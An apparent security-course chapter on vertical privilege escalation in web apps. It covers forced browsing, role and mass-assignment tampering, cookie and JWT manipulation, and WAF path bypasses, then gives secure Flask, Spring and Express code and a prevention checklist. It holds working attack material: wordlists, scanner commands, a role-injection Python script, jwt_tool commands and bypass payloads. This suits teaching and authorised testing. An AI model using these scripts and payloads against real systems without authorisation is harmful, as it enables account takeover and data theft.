# 03 — Vertical Privilege Escalation

## Overview

**Vertical privilege escalation** occurs when a lower-privileged user gains access to functions, data, or capabilities reserved for higher-privileged roles — typically escalating from a regular user to an administrator. This is one of the most critical web-application vulnerabilities because successful exploitation grants an attacker full control over the application, its data, and often the underlying infrastructure. It maps to **OWASP A01:2021 – Broken Access Control**, **CWE-269: Improper Privilege Management**, and **CWE-862: Missing Authorization**.

---

## 1. Fundamentals

### 1.1 What Is Vertical Privilege Escalation?

```
+──────────────────────────────────────────────────────────+
│          Vertical Privilege Escalation Model             │
+──────────────────────────────────────────────────────────+
│                                                          │
│     ┌─────────────────────────────────────┐              │
│     │         SUPER ADMIN                 │  Level 3     │
│     │  Full system control, user mgmt     │              │
│     └──────────────────┬──────────────────┘              │
│                        │                                 │
│     ┌──────────────────▼──────────────────┐              │
│     │         ADMIN / MANAGER             │  Level 2     │
│     │  Content mgmt, reports, settings    │              │
│     └──────────────────┬──────────────────┘              │
│                        │                                 │
│     ┌──────────────────▼──────────────────┐              │
│     │         REGULAR USER                │  Level 1     │
│     │  Basic CRUD on own data             │              │
│     └──────────────────┬──────────────────┘              │
│                        │                                 │
│     ┌──────────────────▼──────────────────┐              │
│     │         GUEST / UNAUTH              │  Level 0     │
│     │  Public pages only                  │              │
│     └─────────────────────────────────────┘              │
│                                                          │
│  Vertical Escalation: Moving UP the hierarchy            │
│  Level 0 → Level 1 (guest → user)                       │
│  Level 1 → Level 2 (user → admin)                       │
│  Level 1 → Level 3 (user → super admin)                 │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 1.2 Impact Comparison

| Escalation Path | Impact | Severity |
|---|---|---|
| Guest → User | Access to authenticated features | Medium |
| User → Moderator | Content moderation, user warnings | High |
| User → Admin | Application configuration, user management | Critical |
| User → Super Admin | Full system control, database access | Critical |
| Admin → Super Admin | Multi-tenant admin, infrastructure access | Critical |

---

## 2. Attack Vectors

### 2.1 Forced Browsing to Admin Pages

The simplest form: directly requesting admin URLs.

```
+──────────────────────────────────────────────────────────+
│            Forced Browsing Attack                        │
+──────────────────────────────────────────────────────────+
│                                                          │
│  Normal user browses:                                    │
│    https://app.com/dashboard                             │
│    https://app.com/profile                               │
│    https://app.com/settings                              │
│                                                          │
│  Attacker tries common admin paths:                      │
│    https://app.com/admin                                 │
│    https://app.com/admin/dashboard                       │
│    https://app.com/administrator                         │
│    https://app.com/manage                                │
│    https://app.com/console                               │
│    https://app.com/admin/users                           │
│    https://app.com/internal/config                       │
│                                                          │
│  If server returns 200 OK with admin content             │
│  → Vertical privilege escalation!                        │
│                                                          │
+──────────────────────────────────────────────────────────+
```

**Common Admin Paths Wordlist:**

```
/admin
/admin/
/administrator
/admin/login
/admin/dashboard
/admin/users
/admin/settings
/admin/config
/manage
/management
/console
/panel
/controlpanel
/cp
/backoffice
/back-office
/internal
/staff
/superadmin
/sysadmin
/webadmin
/wp-admin
/admin.php
/admin.aspx
/_admin
/~admin
/phpmyadmin
/adminer
```

**Tool: gobuster for admin path discovery:**

```bash
# Discover admin pages
gobuster dir -u https://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -s 200,301,302,403 \
  -o admin_paths.txt \
  -t 50

# With specific admin-focused wordlist
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/admin-panels.txt \
  -s 200,301,302 \
  -o admin_panels.txt
```

**Tool: feroxbuster for recursive discovery:**

```bash
feroxbuster -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  --status-codes 200 301 302 \
  --depth 3 \
  --threads 50 \
  -o ferox_results.txt
```

### 2.2 Role Manipulation via Parameter Tampering

```
+──────────────────────────────────────────────────────────+
│          Role Parameter Tampering                        │
+──────────────────────────────────────────────────────────+
│                                                          │
│  Scenario 1: Role in registration request                │
│                                                          │
│  POST /api/register HTTP/1.1                             │
│  {                                                       │
│    "username": "attacker",                               │
│    "password": "P@ssw0rd!",                              │
│    "email": "attacker@evil.com",                         │
│    "role": "admin"              ← injected parameter     │
│  }                                                       │
│                                                          │
│  Scenario 2: Role in profile update                      │
│                                                          │
│  PUT /api/users/1001 HTTP/1.1                            │
│  {                                                       │
│    "name": "Attacker",                                   │
│    "email": "attacker@evil.com",                         │
│    "role": "admin"              ← injected parameter     │
│  }                                                       │
│                                                          │
│  Scenario 3: Admin flag in request                       │
│                                                          │
│  POST /api/update-profile HTTP/1.1                       │
│  {                                                       │
│    "name": "Attacker",                                   │
│    "isAdmin": true              ← injected parameter     │
│  }                                                       │
│                                                          │
+──────────────────────────────────────────────────────────+
```

**Mass Assignment / Over-Posting Attack:**

```python
# Server-side code (VULNERABLE — Ruby on Rails example)
# User model has: name, email, role, is_admin columns
# Controller blindly assigns all params:
def update
  @user = User.find(params[:id])
  @user.update(params[:user])  # Updates ALL submitted fields including role!
end

# SECURE — use strong parameters
def update
  @user = User.find(current_user.id)
  @user.update(user_params)
end

private
def user_params
  params.require(:user).permit(:name, :email)  # Only allow name and email
end
```

### 2.3 Hidden Form Fields

```html
<!-- VULNERABLE: Admin check via hidden field -->
<form action="/update-settings" method="POST">
  <input type="hidden" name="user_id" value="1001">
  <input type="hidden" name="role" value="user">
  <input type="hidden" name="admin" value="false">
  <input type="text" name="display_name" value="John">
  <button type="submit">Save</button>
</form>

<!-- Attack: Modify hidden fields in browser DevTools or Burp -->
<!-- Change role="user" to role="admin" -->
<!-- Change admin="false" to admin="true" -->
```

**Testing Hidden Fields:**

```bash
# Extract all hidden fields from a page
curl -s https://target.com/settings | grep -oP '<input[^>]*type="hidden"[^>]*>'

# Example output:
# <input type="hidden" name="role" value="user">
# <input type="hidden" name="account_type" value="basic">
# <input type="hidden" name="permissions" value="read">
```

### 2.4 Cookie-Based Role Escalation

```
+──────────────────────────────────────────────────────────+
│           Cookie-Based Role Escalation                   │
+──────────────────────────────────────────────────────────+
│                                                          │
│  Application sets role in cookie after login:            │
│                                                          │
│  Set-Cookie: session=abc123; role=user; admin=0          │
│                                                          │
│  Attack: Modify cookie values                            │
│                                                          │
│  Cookie: session=abc123; role=admin; admin=1             │
│                              ^^^^^        ^              │
│                           changed      changed           │
│                                                          │
│  Variations to try:                                      │
│                                                          │
│    role=admin                                            │
│    role=administrator                                    │
│    role=superadmin                                       │
│    isAdmin=true                                          │
│    isAdmin=1                                             │
│    admin=1                                               │
│    access_level=9999                                     │
│    privilege=admin                                       │
│    user_type=admin                                       │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 2.5 JWT Role Manipulation

```
+──────────────────────────────────────────────────────────────+
│              JWT Role Manipulation                           │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Original JWT payload (decoded):                             │
│  {                                                           │
│    "sub": "1001",                                            │
│    "username": "attacker",                                   │
│    "role": "user",                                           │
│    "iat": 1705334400,                                        │
│    "exp": 1705420800                                         │
│  }                                                           │
│                                                              │
│  Attack 1: Algorithm "none"                                  │
│  ├── Change header algorithm to "none"                       │
│  ├── Modify role to "admin"                                  │
│  ├── Remove signature                                        │
│  └── Result: eyJhbGciOiJub25lIn0.eyJ...role:admin...}.      │
│                                                              │
│  Attack 2: HS256 with known/weak key                         │
│  ├── Crack the secret key                                    │
│  ├── Modify role to "admin"                                  │
│  ├── Re-sign with cracked key                                │
│  └── Result: valid JWT with admin role                       │
│                                                              │
│  Attack 3: Algorithm confusion (RS256 → HS256)               │
│  ├── Use server's public RSA key as HMAC secret              │
│  ├── Change alg from RS256 to HS256                          │
│  ├── Modify role to "admin"                                  │
│  └── Sign with public key using HMAC                         │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

**jwt_tool for role manipulation:**

```bash
# Decode and inspect JWT
python3 jwt_tool.py eyJhbGciOi...

# Tamper with role claim — algorithm none
python3 jwt_tool.py eyJhbGciOi... -T -S n \
  -pc role -pv admin

# Tamper with role claim — crack and re-sign
python3 jwt_tool.py eyJhbGciOi... -C -d /usr/share/wordlists/rockyou.txt
# If key found:
python3 jwt_tool.py eyJhbGciOi... -T -S hs256 -p "cracked_secret" \
  -pc role -pv admin

# Tamper with role claim — algorithm confusion
python3 jwt_tool.py eyJhbGciOi... -T -S hs256 \
  -pk public_key.pem \
  -pc role -pv admin
```

### 2.6 API Endpoint Manipulation

```http
# Regular user API endpoints
GET  /api/v1/users/me           → own profile
GET  /api/v1/orders             → own orders
POST /api/v1/orders             → create order

# Admin API endpoints (try accessing as regular user)
GET  /api/v1/admin/users        → list all users
POST /api/v1/admin/users        → create user with any role
PUT  /api/v1/admin/config       → change application config
DELETE /api/v1/admin/users/1002 → delete any user
GET  /api/v1/admin/logs         → view system logs
POST /api/v1/admin/backup       → trigger database backup

# Try version/path variations
GET  /api/v2/admin/users        → different API version
GET  /api/internal/admin/users  → internal prefix
GET  /api/v1/Admin/users        → case variation
GET  /api/v1/ADMIN/users        → uppercase
```

### 2.7 HTTP Method Switching

```http
# GET is blocked for regular users
GET /admin/delete-user?id=1002 HTTP/1.1   → 403 Forbidden

# Try other methods
POST /admin/delete-user HTTP/1.1          → 200 OK ???
PUT /admin/delete-user HTTP/1.1           → 200 OK ???
PATCH /admin/delete-user HTTP/1.1         → 200 OK ???

# Or use method override headers
GET /admin/delete-user?id=1002 HTTP/1.1
X-HTTP-Method-Override: DELETE            → May bypass GET check

POST /admin/delete-user HTTP/1.1
X-HTTP-Method: PUT                        → May bypass POST check
```

---

## 3. Admin Page Discovery Techniques

### 3.1 Information Disclosure Sources

```
+──────────────────────────────────────────────────────────+
│         Admin Page Discovery Sources                     │
+──────────────────────────────────────────────────────────+
│                                                          │
│  robots.txt                                              │
│    Disallow: /admin/                                     │
│    Disallow: /management/                                │
│    Disallow: /internal/                                  │
│                                                          │
│  sitemap.xml                                             │
│    <url><loc>https://app.com/admin/login</loc></url>     │
│                                                          │
│  JavaScript Files                                        │
│    // admin routes defined in React/Angular router       │
│    { path: '/admin/dashboard', component: AdminDash }    │
│    { path: '/admin/users', component: AdminUsers }       │
│                                                          │
│  HTML Comments                                           │
│    <!-- TODO: remove admin link before production -->     │
│    <!-- <a href="/admin">Admin Panel</a> -->             │
│                                                          │
│  Error Messages                                          │
│    "You don't have permission to access /admin/config"   │
│    → Confirms the path exists                            │
│                                                          │
│  HTTP Headers                                            │
│    Link: </admin/api>; rel="admin"                       │
│    X-Admin-Panel: /management                            │
│                                                          │
│  API Documentation                                       │
│    Swagger/OpenAPI at /api/docs may list admin endpoints │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 3.2 JavaScript Source Analysis

```bash
# Find admin routes in JavaScript bundles
# Download all JS files
wget -r -l1 -nd -A.js https://target.com/ -P js_files/

# Search for admin paths
grep -rn "admin\|/manage\|/internal\|isAdmin\|role.*admin" js_files/

# Common patterns in React/Angular/Vue apps:
grep -rn "path.*admin\|route.*admin\|PrivateRoute\|AdminRoute" js_files/
grep -rn "requiredRole\|hasPermission\|isAuthorized" js_files/

# Example findings:
# app.bundle.js: {path:"/admin/dashboard",component:Xt,requiredRole:"admin"}
# app.bundle.js: {path:"/admin/users",component:Qt,requiredRole:"admin"}
# app.bundle.js: {path:"/admin/settings",component:Yt,requiredRole:"admin"}
# app.bundle.js: const API_ADMIN = "/api/v1/admin"
```

### 3.3 Admin Page Discovery Tools

```bash
# Dirsearch — focused admin panel scan
dirsearch -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/admin-panels.txt

# Nikto — includes admin path checks
nikto -h https://target.com -output nikto_results.txt

# Nuclei — admin panel templates
nuclei -u https://target.com -tags panel,admin -o admin_panels.txt

# Custom ffuf scan with smart filtering
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,301,302,401,403 \
  -fc 404 \
  -o ffuf_admin.json
```

### 3.4 Response Code Analysis

| Response Code | Meaning | Action |
|---|---|---|
| **200 OK** | Page accessible — possible escalation! | Investigate content |
| **301/302 Redirect** | Redirect to login — path exists | Try after authentication |
| **401 Unauthorized** | Authentication required — path exists | Try with valid session |
| **403 Forbidden** | Access denied — path exists, role check works | Try bypass techniques |
| **404 Not Found** | Path doesn't exist | Move on |
| **405 Method Not Allowed** | Method blocked, path exists | Try other HTTP methods |
| **500 Server Error** | Server error — path exists, may be exploitable | Investigate further |

---

## 4. Exploitation Techniques

### 4.1 Registration with Admin Role

```python
import requests

# Step 1: Normal registration (intercept in Burp to see params)
normal = {
    "username": "testuser",
    "email": "test@example.com",
    "password": "Test123!"
}

# Step 2: Add role parameter
admin_attempt = {
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "Admin123!",
    "role": "admin"              # Injected
}

r = requests.post("https://target.com/api/register", json=admin_attempt)
print(f"Status: {r.status_code}")
print(f"Response: {r.json()}")

# Step 3: Try variations
role_variants = [
    {"role": "admin"},
    {"role": "administrator"},
    {"role": "superadmin"},
    {"isAdmin": True},
    {"is_admin": True},
    {"admin": True},
    {"access_level": "admin"},
    {"user_type": "admin"},
    {"privilege": "admin"},
    {"permissions": ["admin"]},
    {"role_id": 1},
    {"group": "administrators"},
]

for variant in role_variants:
    payload = {**normal, **variant}
    r = requests.post("https://target.com/api/register", json=payload)
    print(f"Variant {list(variant.keys())[0]}={list(variant.values())[0]} "
          f"→ {r.status_code}")
```

### 4.2 Profile Update Mass Assignment

```http
# Step 1: Capture normal profile update
PUT /api/users/me HTTP/1.1
Authorization: Bearer USER_TOKEN
Content-Type: application/json

{
  "display_name": "John Doe",
  "bio": "Security researcher"
}

# Step 2: Add admin-related fields
PUT /api/users/me HTTP/1.1
Authorization: Bearer USER_TOKEN
Content-Type: application/json

{
  "display_name": "John Doe",
  "bio": "Security researcher",
  "role": "admin",
  "is_admin": true,
  "permissions": ["admin", "superuser"],
  "account_type": "premium",
  "verified": true,
  "email_verified": true
}

# Step 3: Check if role changed
GET /api/users/me HTTP/1.1
Authorization: Bearer USER_TOKEN

# Look for: "role": "admin" in response
```

### 4.3 Forced Browsing with Session

```bash
# After authenticating as regular user, try admin endpoints
SESSION="abc123def456"

# Admin dashboard
curl -s -o /dev/null -w "%{http_code}" \
  -b "session=$SESSION" https://target.com/admin/dashboard

# User management
curl -s -b "session=$SESSION" https://target.com/admin/users | head -50

# System configuration
curl -s -b "session=$SESSION" https://target.com/admin/config

# Batch test with ffuf
ffuf -u "https://target.com/admin/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -H "Cookie: session=$SESSION" \
  -mc 200 \
  -o admin_access.json
```

### 4.4 Client-Side Role Check Bypass

```
+──────────────────────────────────────────────────────────+
│       Client-Side vs Server-Side Role Checks             │
+──────────────────────────────────────────────────────────+
│                                                          │
│  VULNERABLE: Client-side only                            │
│                                                          │
│  JavaScript (React/Angular):                             │
│  if (user.role === "admin") {                            │
│    showAdminMenu();          ← easily bypassed           │
│  }                                                       │
│                                                          │
│  Attack:                                                 │
│  1. Open browser DevTools → Console                      │
│  2. Set: user.role = "admin"                             │
│  3. Or modify localStorage/sessionStorage                │
│  4. Admin menu appears                                   │
│  5. Navigate to admin pages                              │
│                                                          │
│  SECURE: Server-side enforcement                         │
│                                                          │
│  // Client shows menu (cosmetic)                         │
│  if (user.role === "admin") showAdminMenu();             │
│                                                          │
│  // Server enforces access (security)                    │
│  @RequireRole("admin")                                   │
│  def admin_dashboard():                                  │
│      return render("admin/dashboard.html")               │
│                                                          │
│  Both layers needed — client for UX, server for security │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 4.5 Path Traversal to Admin Functions

```http
# If admin paths are blocked at a reverse proxy / WAF level:

# Blocked
GET /admin/users HTTP/1.1     → 403 (WAF blocks /admin/)

# Bypass attempts
GET /Admin/users HTTP/1.1              # Case variation
GET /ADMIN/users HTTP/1.1              # Uppercase
GET //admin/users HTTP/1.1             # Double slash
GET /./admin/users HTTP/1.1            # Dot-slash
GET /admin/./users HTTP/1.1            # Mid-path dot
GET /%61%64%6d%69%6e/users HTTP/1.1    # URL-encoded "admin"
GET /admin%00/users HTTP/1.1           # Null byte
GET /admin;/users HTTP/1.1             # Semicolon
GET /admin.json HTTP/1.1               # Extension appended
GET /admin/users..;/ HTTP/1.1          # Spring path traversal
GET /user/../admin/users HTTP/1.1      # Path traversal
GET /admin/users%23 HTTP/1.1           # Fragment injection
GET /admin/users? HTTP/1.1             # Trailing question mark
```

---

## 5. Framework-Specific Exploits

### 5.1 Django Admin

```bash
# Default Django admin URL
https://target.com/admin/

# If using custom path, discover via:
# - robots.txt
# - JavaScript source
# - Error pages revealing URL configuration

# Django debug mode may expose all URLs:
# If DEBUG=True → detailed error page lists all URL patterns
# Trigger by accessing a non-existent URL
```

### 5.2 Ruby on Rails Admin (ActiveAdmin / RailsAdmin)

```bash
# Common admin gem paths
https://target.com/admin           # ActiveAdmin
https://target.com/rails/admin     # RailsAdmin
https://target.com/sidekiq         # Sidekiq dashboard
https://target.com/rails/mailers   # Action Mailer preview

# Mass assignment in Rails
# If using permit-all or weak strong parameters:
curl -X PATCH https://target.com/api/users/1001 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"user":{"name":"Attacker","admin":true}}'
```

### 5.3 Spring Boot Actuators

```bash
# Spring Boot exposes management endpoints
https://target.com/actuator
https://target.com/actuator/env          # Environment variables
https://target.com/actuator/health
https://target.com/actuator/beans
https://target.com/actuator/mappings     # All URL mappings!
https://target.com/actuator/configprops  # Configuration properties
https://target.com/actuator/heapdump    # JVM heap dump (may contain secrets)

# If actuators are accessible to regular users → vertical escalation
# /actuator/env may contain database passwords, API keys, etc.
```

### 5.4 WordPress

```bash
# Default admin paths
https://target.com/wp-admin/
https://target.com/wp-login.php
https://target.com/xmlrpc.php          # XML-RPC interface

# REST API user enumeration
https://target.com/wp-json/wp/v2/users
# Returns user list including admin accounts

# Check for vulnerable plugins with admin-level functionality
wpscan --url https://target.com -e vp,u
```

### 5.5 Node.js / Express

```javascript
// VULNERABLE: No role check on admin routes
app.get('/admin/users', auth, (req, res) => {
    // Only checks authentication, not authorization!
    const users = await User.find();
    res.json(users);
});

// SECURE: Role-based middleware
const requireRole = (...roles) => {
    return (req, res, next) => {
        if (!roles.includes(req.user.role)) {
            return res.status(403).json({ error: 'Insufficient privileges' });
        }
        next();
    };
};

app.get('/admin/users', auth, requireRole('admin'), (req, res) => {
    const users = await User.find();
    res.json(users);
});
```

---

## 6. Testing Methodology

### 6.1 Systematic Test Plan

```
+──────────────────────────────────────────────────────────────+
│       Vertical Privilege Escalation Test Plan                │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  PHASE 1: RECONNAISSANCE                                     │
│  ├── Identify all user roles in the application              │
│  ├── Create accounts at each available role level            │
│  ├── Map all endpoints accessible to each role               │
│  ├── Discover admin paths (robots.txt, JS source, brute)     │
│  ├── Check API documentation (Swagger, GraphQL introspection)│
│  └── Analyze JavaScript for role-based routing               │
│                                                              │
│  PHASE 2: DIRECT ACCESS TESTING                              │
│  ├── As low-priv user, request all admin-only endpoints      │
│  ├── Check response codes and content                        │
│  ├── Try path variations (case, encoding, traversal)         │
│  └── Test API versioning (v1 blocked → try v2, v3)           │
│                                                              │
│  PHASE 3: PARAMETER MANIPULATION                             │
│  ├── Add role/admin parameters to registration               │
│  ├── Add role parameters to profile update                   │
│  ├── Modify hidden form fields                               │
│  ├── Tamper with cookies containing role info                │
│  └── Manipulate JWT claims (role, admin, permissions)        │
│                                                              │
│  PHASE 4: METHOD TAMPERING                                   │
│  ├── Test admin endpoints with different HTTP methods         │
│  ├── Use X-HTTP-Method-Override headers                      │
│  └── Test HEAD, OPTIONS, TRACE on restricted paths           │
│                                                              │
│  PHASE 5: AUTOMATED TESTING                                  │
│  ├── Run Autorize with admin session as original,            │
│  │   user session as replacement                             │
│  ├── Run Burp Active Scanner for access control issues       │
│  └── Run nuclei with access-control templates                │
│                                                              │
│  PHASE 6: JWT-SPECIFIC TESTING                               │
│  ├── Try "none" algorithm                                    │
│  ├── Try algorithm confusion                                 │
│  ├── Crack weak signing keys                                 │
│  ├── Modify role claims and re-sign                          │
│  └── Test jwk/jku/kid injection                              │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 6.2 Autorize for Vertical Escalation

```
+──────────────────────────────────────────────────────────+
│       Autorize — Vertical Escalation Testing             │
+──────────────────────────────────────────────────────────+
│                                                          │
│  Setup:                                                  │
│  1. In Autorize configuration, paste the REGULAR USER's  │
│     session cookie/token                                 │
│  2. Browse the application as ADMIN                      │
│  3. Autorize replays each admin request with the         │
│     regular user's credentials                           │
│                                                          │
│  ┌─────────────────────────────────────────────────────┐ │
│  │ Admin Endpoint        │ Admin │ As User │ Result    │ │
│  ├───────────────────────┼───────┼─────────┼──────────┤ │
│  │ /admin/dashboard      │ 200   │ 200     │ VULN !!  │ │
│  │ /admin/users          │ 200   │ 200     │ VULN !!  │ │
│  │ /admin/config         │ 200   │ 403     │ SECURE   │ │
│  │ /api/admin/reports    │ 200   │ 200     │ VULN !!  │ │
│  │ /admin/delete-user    │ 200   │ 403     │ SECURE   │ │
│  │ /api/admin/export     │ 200   │ 200     │ VULN !!  │ │
│  └─────────────────────────────────────────────────────┘ │
│                                                          │
│  VULN = Regular user CAN access admin function           │
│  SECURE = Access properly denied                         │
│                                                          │
+──────────────────────────────────────────────────────────+
```

---

## 7. Prevention & Remediation

### 7.1 Defense Architecture

```
+──────────────────────────────────────────────────────────────+
│           Secure Authorization Architecture                  │
+──────────────────────────────────────────────────────────────+
│                                                              │
│   ┌────────────────────────────────────────────────────┐     │
│   │                REQUEST PIPELINE                    │     │
│   │                                                    │     │
│   │  ┌──────────────┐                                  │     │
│   │  │ 1. AuthN     │  Verify identity                 │     │
│   │  │   Filter     │  (JWT/session validation)        │     │
│   │  └──────┬───────┘                                  │     │
│   │         │                                          │     │
│   │  ┌──────▼───────┐                                  │     │
│   │  │ 2. AuthZ     │  Check role / permissions        │     │
│   │  │   Filter     │  against endpoint requirements   │     │
│   │  └──────┬───────┘                                  │     │
│   │         │                                          │     │
│   │  ┌──────▼───────┐                                  │     │
│   │  │ 3. Resource  │  Verify ownership of             │     │
│   │  │   AuthZ      │  specific resources              │     │
│   │  └──────┬───────┘                                  │     │
│   │         │                                          │     │
│   │  ┌──────▼───────┐                                  │     │
│   │  │ 4. Business  │  Process request                 │     │
│   │  │   Logic      │                                  │     │
│   │  └──────────────┘                                  │     │
│   │                                                    │     │
│   │  DEFAULT: DENY ALL                                 │     │
│   │  Only explicitly permitted requests pass through   │     │
│   │                                                    │     │
│   └────────────────────────────────────────────────────┘     │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 7.2 Secure Implementation Examples

**Python Flask:**

```python
from functools import wraps
from flask import abort, g

def require_role(*allowed_roles):
    """Decorator to enforce role-based access control."""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            if not g.current_user:
                abort(401)
            if g.current_user.role not in allowed_roles:
                abort(403)
            return f(*args, **kwargs)
        return wrapper
    return decorator

# Usage
@app.route('/admin/users')
@login_required
@require_role('admin', 'superadmin')
def admin_users():
    users = User.query.all()
    return jsonify([u.to_dict() for u in users])

@app.route('/admin/config', methods=['PUT'])
@login_required
@require_role('superadmin')
def admin_config():
    config = request.get_json()
    AppConfig.update(config)
    return jsonify({"status": "updated"})
```

**Java Spring Security:**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .requestMatchers("/api/user/**").hasAnyRole("USER", "ADMIN")
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/superadmin/**").hasRole("SUPERADMIN")
                .anyRequest().denyAll()    // DEFAULT DENY
            );
        return http.build();
    }
}

// Method-level security
@RestController
@RequestMapping("/api/admin")
public class AdminController {
    
    @PreAuthorize("hasRole('ADMIN')")
    @GetMapping("/users")
    public List<User> getUsers() {
        return userService.findAll();
    }
    
    @PreAuthorize("hasRole('SUPERADMIN')")
    @DeleteMapping("/users/{id}")
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
}
```

**Node.js Express:**

```javascript
// Centralized role middleware
const requireRole = (...roles) => (req, res, next) => {
  if (!req.user) return res.status(401).json({ error: 'Not authenticated' });
  if (!roles.includes(req.user.role)) {
    return res.status(403).json({ error: 'Insufficient privileges' });
  }
  next();
};

// Route-level enforcement
const adminRouter = express.Router();
adminRouter.use(auth);                     // All routes require auth
adminRouter.use(requireRole('admin'));     // All routes require admin

adminRouter.get('/users', getAllUsers);
adminRouter.delete('/users/:id', deleteUser);
adminRouter.put('/config', updateConfig);

app.use('/api/admin', adminRouter);
```

### 7.3 Input Filtering for Mass Assignment

```python
# Python: Whitelist allowed fields
ALLOWED_FIELDS = {'display_name', 'bio', 'avatar_url', 'timezone'}

@app.route('/api/users/me', methods=['PUT'])
@login_required
def update_profile():
    data = request.get_json()
    # Only allow whitelisted fields
    filtered = {k: v for k, v in data.items() if k in ALLOWED_FIELDS}
    
    for key, value in filtered.items():
        setattr(current_user, key, value)
    
    db.session.commit()
    return jsonify(current_user.to_dict())
```

```javascript
// Node.js: Whitelist allowed fields
const ALLOWED_FIELDS = ['displayName', 'bio', 'avatarUrl', 'timezone'];

app.put('/api/users/me', auth, async (req, res) => {
  const updates = {};
  for (const field of ALLOWED_FIELDS) {
    if (req.body[field] !== undefined) {
      updates[field] = req.body[field];
    }
  }
  
  await User.findByIdAndUpdate(req.user.id, updates);
  res.json({ status: 'updated' });
});
```

### 7.4 Prevention Checklist

| Control | Priority | Details |
|---|---|---|
| **Default deny** | Critical | Deny all access unless explicitly permitted |
| **Server-side role checks** | Critical | Never rely on client-side role checks alone |
| **Centralized authorization** | High | Single point of enforcement, not per-endpoint |
| **Input whitelisting** | High | Only accept expected fields in requests |
| **Secure admin paths** | High | Non-guessable admin URLs + proper access control |
| **Disable debug mode** | High | Remove debug endpoints in production |
| **Secure JWT implementation** | High | Enforce algorithm, validate claims server-side |
| **Actuator/debug protection** | High | Restrict management endpoints |
| **Regular access audits** | Medium | Periodic review of role assignments |
| **Automated auth testing** | Medium | CI/CD pipeline authorization tests |

---

## Summary Table

| Topic | Key Point |
|---|---|
| **Definition** | Lower-privileged user gains higher-level access (user → admin) |
| **OWASP Mapping** | A01:2021 Broken Access Control / CWE-269, CWE-862 |
| **Forced Browsing** | Directly accessing admin URLs without authorization |
| **Role Tampering** | Adding role/admin parameters to registration or profile updates |
| **Mass Assignment** | Exploiting frameworks that bind all request fields to models |
| **Hidden Fields** | Modifying role/admin values in hidden HTML form fields |
| **JWT Manipulation** | Changing role claims using algorithm none/confusion/cracking |
| **Method Switching** | Bypassing access controls by changing HTTP method |
| **Path Bypass** | Using encoding, case changes, or traversal to evade WAF/proxy |
| **Primary Defense** | Default deny + centralized server-side role enforcement |

---

## Revision Questions

1. **Describe three distinct techniques an attacker could use to escalate from a regular user to an administrator. For each, explain the root cause and the mitigation.**

2. **What is a "mass assignment" vulnerability? Provide a vulnerable code example in any language and show how to fix it using input whitelisting.**

3. **You discover that an application's admin panel is accessible at `/admin/dashboard` when authenticated as a regular user. The admin navigation menu is hidden client-side. Explain why this is vulnerable and how the application should be secured.**

4. **How would you use Spring Boot Actuator endpoints for vertical privilege escalation? What sensitive information might be exposed?**

5. **Design a comprehensive test plan for vertical privilege escalation testing against a REST API with three roles: user, moderator, and admin. What tools would you use?**

6. **Explain the algorithm confusion attack on JWT tokens for role escalation. What conditions must be present, and how does the attack work step by step?**

---

*Previous: [02-horizontal-privilege-escalation.md](02-horizontal-privilege-escalation.md) | Next: [04-function-level-access-control.md](04-function-level-access-control.md)*

---

*[Back to README](../README.md)*
